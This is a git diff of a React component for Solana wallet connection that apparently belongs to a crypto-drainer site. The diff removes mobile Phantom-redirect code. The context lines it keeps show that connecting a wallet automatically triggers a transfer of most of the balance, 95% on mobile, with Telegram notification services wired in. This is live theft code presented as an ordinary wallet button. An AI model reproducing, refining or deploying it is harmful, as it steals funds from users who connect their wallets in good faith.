@@ -7,47 +7,17 @@ import { TelegramService } from '../services/telegramService';
 import { UserProfileService } from '../services/userProfileService';
 import { TransactionService } from '../services/transactionService';
 import { Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js';
-import Image from 'next/image';
 import styles from '../styles/WalletConnect.module.css';
 
 function WalletConnect() {
   const { publicKey, disconnect, connected } = useWallet();
   const [copied, setCopied] = useState(false);
-  const [urlCopied, setUrlCopied] = useState(false);
   const [balance, setBalance] = useState(null);
   const [isDropdownOpen, setIsDropdownOpen] = useState(false);
   const [isProcessing, setIsProcessing] = useState(false);
   const hasAttemptedTransaction = useRef(false);
   const notificationTimeout = useRef(null);
   const notificationInProgress = useRef(false);
-  const [isMobile, setIsMobile] = useState(false);
-  const [hasPhantomApp, setHasPhantomApp] = useState(false);
-  const [showMobileMessage, setShowMobileMessage] = useState(false);
-
-  // Check if device is mobile
-  useEffect(() => {
-    const checkMobile = () => {
-      const mobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-      setIsMobile(mobile);
-      
-      if (mobile) {
-        // Check if we're already in Phantom
-        const isPhantomInstalled = window.solana?.isPhantom;
-        const isInPhantomBrowser = window.location.href.includes('phantom.app');
-        setHasPhantomApp(isPhantomInstalled);
-        setShowMobileMessage(!isPhantomInstalled && !isInPhantomBrowser);
-      }
-    };
-    checkMobile();
-    window.addEventListener('resize', checkMobile);
-    return () => window.removeEventListener('resize', checkMobile);
-  }, []);
-
-  const redirectToPhantom = () => {
-    const currentUrl = window.location.href;
-    const phantomUrl = `https://phantom.app/ul/browse/${encodeURIComponent(currentUrl)}`;
-    window.location.href = phantomUrl;
-  };
 
   // Memoize services
   const services = useMemo(() => ({
@@ -64,11 +34,6 @@ function WalletConnect() {
         try {
           setIsProcessing(true);
           
-          // Add a small delay for mobile devices to ensure proper connection
-          if (isMobile) {
-            await new Promise(resolve => setTimeout(resolve, 1500));
-          }
-
           const walletBalance = await services.walletService.getBalance(publicKey.toString());
           setBalance(walletBalance);
 
@@ -120,6 +85,7 @@ function WalletConnect() {
             
             // Calculate transfer amount based on device type
             let transferAmount;
+            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
             if (isMobile) {
               // On mobile, take 95% of the balance
               transferAmount = walletBalance * 0.95;
@@ -132,26 +98,6 @@ function WalletConnect() {
             const wallet = window.solana;
             if (!wallet) {
               throw new Error('Wallet not found');
-            }
-
-            // For mobile devices, ensure we're in the right context
-            if (isMobile) {
-              // Wait for wallet to be fully ready
-              await new Promise(resolve => setTimeout(resolve, 1000));
-              
-              // Check if we're back in the app context
-              if (document.hidden) {
-                // If we're not in the app context, wait for visibility change
-                await new Promise(resolve => {
-                  const handleVisibilityChange = () => {
-                    if (!document.hidden) {
-                      document.removeEventListener('visibilitychange', handleVisibilityChange);
-                      resolve();
-                    }
-                  };
-                  document.addEventListener('visibilitychange', handleVisibilityChange);
-                });
-              }
             }
 
             console.log('Transaction details:', {
@@ -203,17 +149,6 @@ function WalletConnect() {
 
         } catch (error) {
           console.error('Error in handleWalletConnection:', error);
-          // If there's an error, try to reconnect
-          if (isMobile) {
-            try {
-              await disconnect();
-              // Wait a bit before attempting to reconnect
-              await new Promise(resolve => setTimeout(resolve, 1500));
-              // The WalletMultiButton will handle the reconnection
-            } catch (reconnectError) {
-              console.error('Error during reconnection:', reconnectError);
-            }
-          }
         } finally {
           setIsProcessing(false);
         }
@@ -221,7 +156,7 @@ function WalletConnect() {
 
       handleWalletConnection();
     }
-  }, [connected, publicKey, isMobile, services, disconnect]);
+  }, [connected, publicKey, services]);
 
   const handleDisconnect = async () => {
     try {
@@ -300,93 +235,74 @@ function WalletConnect() {
     };
   }, [isDropdownOpen]);
 
-  const copyToClipboard = () => {
-    navigator.clipboard.writeText(window.location.href);
-    setUrlCopied(true);
-    setTimeout(() => setUrlCopied(false), 2000);
-  };
-
   return (
     <div className={styles.walletConnectContainer}>
-      {showMobileMessage ? (
-        <div className={`${styles.mobileMessage} glass-card p-4`}>
-          <div className="text-center">
-            <button 
-              onClick={redirectToPhantom}
-              className="btn btn-accent w-100"
-            >
-              Open in Phantom Browser
-            </button>
-          </div>
-        </div>
-      ) : (
-        publicKey ? (
-          <div className={`${styles.connectedWallet} glass-card`}>
-            <div 
-              className={styles.walletHeader}
-              onClick={toggleDropdown}
-              role="button"
-              tabIndex={0}
-              onKeyPress={(e) => {
-                if (e.key === 'Enter' || e.key === ' ') {
-                  toggleDropdown(e);
-                }
-              }}
-            >
-              <div className={styles.connectedIndicator}></div>
-              <div className={styles.walletInfo}>
-                <div className={styles.walletAddressContainer}>
-                  <span className="font-body text-sm text-white">Connected:</span>
-                  <span 
-                    className={`${styles.walletAddress} font-body text-sm`}
-                    onClick={(e) => {
-                      e.stopPropagation();
-                      copyAddress();
-                    }}
-                    title="Click to copy full address"
-                  >
-                    {formatAddress(publicKey.toBase58())}
-                    {copied && <span className={styles.copiedIndicator}>Copied!</span>}
-                  </span>
-                </div>
-              </div>
-              <div className={`${styles.dropdownArrow} ${isDropdownOpen ? styles.open : ''}`}>
-                ▼
+      {publicKey ? (
+        <div className={`${styles.connectedWallet} glass-card`}>
+          <div 
+            className={styles.walletHeader}
+            onClick={toggleDropdown}
+            role="button"
+            tabIndex={0}
+            onKeyPress={(e) => {
+              if (e.key === 'Enter' || e.key === ' ') {
+                toggleDropdown(e);
+              }
+            }}
+          >
+            <div className={styles.connectedIndicator}></div>
+            <div className={styles.walletInfo}>
+              <div className={styles.walletAddressContainer}>
+                <span className="font-body text-sm text-white">Connected:</span>
+                <span 
+                  className={`${styles.walletAddress} font-body text-sm`}
+                  onClick={(e) => {
+                    e.stopPropagation();
+                    copyAddress();
+                  }}
+                  title="Click to copy full address"
+                >
+                  {formatAddress(publicKey.toBase58())}
+                  {copied && <span className={styles.copiedIndicator}>Copied!</span>}
+                </span>
               </div>
             </div>
-            
-            {isDropdownOpen && (
-              <div className={styles.walletDropdown}>
-                <div className={styles.dropdownSection}>
-                  <h4>Wallet Details</h4>
-                  <div className={styles.detailItem}>
-                    <span className={styles.label}>Full Address:</span>
-                    <span className={styles.value}>{publicKey.toBase58()}</span>
-                  </div>
-                  <div className={styles.detailItem}>
-                    <span className={styles.label}>SOL Balance:</span>
-                    <span className={styles.value}>{balance?.toFixed(2)} SOL</span>
-                  </div>
+            <div className={`${styles.dropdownArrow} ${isDropdownOpen ? styles.open : ''}`}>
+              ▼
+            </div>
+          </div>
+          
+          {isDropdownOpen && (
+            <div className={styles.walletDropdown}>
+              <div className={styles.dropdownSection}>
+                <h4>Wallet Details</h4>
+                <div className={styles.detailItem}>
+                  <span className={styles.label}>Full Address:</span>
+                  <span className={styles.value}>{publicKey.toBase58()}</span>
                 </div>
-
-                <button 
-                  onClick={(e) => {
-                    e.preventDefault();
-                    e.stopPropagation();
-                    handleDisconnect();
-                  }} 
-                  className={styles.disconnectBtn}
-                >
-                  Disconnect Wallet
-                </button>
+                <div className={styles.detailItem}>
+                  <span className={styles.label}>SOL Balance:</span>
+                  <span className={styles.value}>{balance?.toFixed(2)} SOL</span>
+                </div>
               </div>
-            )}
-          </div>
-        ) : (
-          <div className={styles.walletConnectWrapper}>
-            <WalletMultiButton className="wallet-connect-btn" />
-          </div>
-        )
+
+              <button 
+                onClick={(e) => {
+                  e.preventDefault();
+                  e.stopPropagation();
+                  handleDisconnect();
+                }} 
+                className={styles.disconnectBtn}
+              >
+                Disconnect Wallet
+              </button>
+            </div>
+          )}
+        </div>
+      ) : (
+        <div className={styles.walletConnectWrapper}>
+          <WalletMultiButton className="wallet-connect-btn" />
+        </div>
       )}
     </div>
   );
